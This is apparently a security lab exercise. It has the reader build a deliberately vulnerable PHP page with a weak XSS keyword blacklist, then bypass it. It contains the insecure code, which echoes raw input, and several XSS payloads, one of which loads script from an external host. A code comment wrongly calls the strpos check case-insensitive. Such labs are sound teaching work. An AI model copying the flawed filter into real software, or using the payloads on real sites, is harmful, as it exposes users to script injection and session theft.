# Write A Web Application With Insecure XSS Filters
An insecure XSS filter occurs when an application fails to properly validate user input, allowing attackers to inject malicious code into web pages. Some developers use blacklists to block dangerous strings like `<script` or `onload=` but often miss edge cases, leaving the application vulnerable to XSS attacks.

## References
- [OWASP - XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) by OWASP
- [How-To - Disable Browser Security Features](https://www.postexplo.com/forum/security-in-general/terms/610-how-to-disable-browser-security-features) by Resheph on PosteXplo
- [XSS Filter Evasion and WAF Bypassing Tactics](https://n3t-hunt3r.gitbook.io/pentest-book) by n3t_hunt3r
- [Bypassing Signature-Based XSS Filters: Modifying HTML](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html) by PortSwigger

## Tasks
- Write a simple web application containing multiple input fields that are vulnerable to cross-site scripting
- Apply insecure filtering mechanisms to these input fields, such as a blacklist that attempts to block commonly known dangerous XSS keywords
- Develop a blacklist containing at least 30 dangerous XSS keywords (e.g., `<script>`, `onload=`, `alert(`, etc.) that you plan to use to try and protect the input fields
- Use various XSS techniques, such as HTML encoding, JavaScript obfuscation, and bypassing blacklist filters, to inject malicious JavaScript code into the input fields
- Verify that the injected malicious JavaScript code is executed on the web application's frontend, demonstrating the bypass of the insecure XSS filters

## Practical Approach
1. Create a new PHP file named `vulnerable_xss.php` in the htdocs folder in XAMPP 
2. PHP for vulnerable web application:
   ```
   <?php
   // XSS Blacklist - intentionally weakened to make it easier to bypass
   $blacklist = [
       "<script>", "</script>", "<img>", "<svg>", "onload=", "onerror=",
       "alert(", "prompt(", "confirm(", "javascript:", "document.cookie",
       "window.location", "eval(", "setTimeout(", "setInterval(",
       "innerHTML", "outerHTML", "src=", "href=", "<iframe>", "</iframe>",
       "expression(", "vbscript:", "style=", "onmouseover=", "onfocus=",
       "onblur=", "onclick=", "onkeypress=", "onkeyup=", "onkeydown="
   ];
   
   // Function to check for blacklisted words
   function is_blacklisted($input, $blacklist) {
       // Weak blacklisting: no decoding, no normalization
       foreach ($blacklist as $word) {
           // Case-insensitive match for raw strings
           if (strpos($input, $word) !== false) {
               return true;
           }
       }
       return false;
   }
   
   // Handle form submission
   if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $user_input = $_POST['user_input'];
       
       // Check if input contains any blacklisted words
       if (is_blacklisted($user_input, $blacklist)) {
           echo "Input rejected: contains blacklisted content.";
       } else {
           // Directly echo input into the page (vulnerable to XSS)
           echo "User Input: " . $user_input;
           // echo "<div>User Input: $user_input</div>";
       }
   }
   ?>
   
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Insecure XSS Filter</title>
   </head>
   <body>
       <h1>Vulnerable XSS Web App</h1>
       <form action="" method="POST">
           <label for="user_input">Enter some text:</label><br>
           <input type="text" id="user_input" name="user_input" size="100"><br><br>
           <input type="submit" value="Submit">
       </form>
   </body>
   </html>
   ```
3. Despite the blacklist, the following XSS techniques could bypass the filtering
   - HTML encoding: Some browsers might interpret encoded characters that resemble dangerous inputs. For instance:
     Using `&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;` instead of `<script>`
   - Event Handlers in Other Elements:
     Example: `<img src="x" onerror="alert('XSS')">` might bypass filters if `onerror=` is not blacklisted correctly
   - Obfuscation Techniques:
     Using techniques such as breaking keywords (e.g., `java + script:`) to bypass string-based filters
4. To test the vulnerability, use the following payloads
   SVG element with onload event handler
   ```
   <svg ONLOAD="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
   ```
   IMG onerror and JavaScript Alert Encode
   ```
   <img SRC=x ONERROR="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
   ```
   Basic XSS Test Without Filter Evasion
   ```
   <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
   ```
   URL string evasion
   ```
   <A HREF="http://www.google.com./">XSS</A>
   ```
   Trigger JavaScript execution using formaction
   ```
   <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
   ```
5. For validation purposes, ensure that the injected JavaScript successfully executes on the frontend (e.g., showing an alert box) and different bypass techniques successfully trigger the XSS, demonstrating the insecure filter
